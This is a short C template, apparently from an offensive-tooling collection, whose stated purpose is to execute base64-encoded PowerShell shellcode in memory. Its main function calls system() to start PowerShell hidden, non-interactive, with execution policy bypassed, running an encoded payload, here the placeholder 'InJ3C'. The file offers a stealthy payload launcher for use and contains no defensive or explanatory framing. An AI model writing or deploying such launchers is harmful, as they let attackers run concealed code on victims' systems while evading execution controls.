// C template | Author: r00t-3xp10it
// execute shellcode powershell base 64 encoded into memory (ram)
// ---

#include <stdio.h>
#include <stdlib.h>

int main()
{
    system("powershell -nop -exec bypass -win Hidden -noni -enc InJ3C");
    return 0;
}
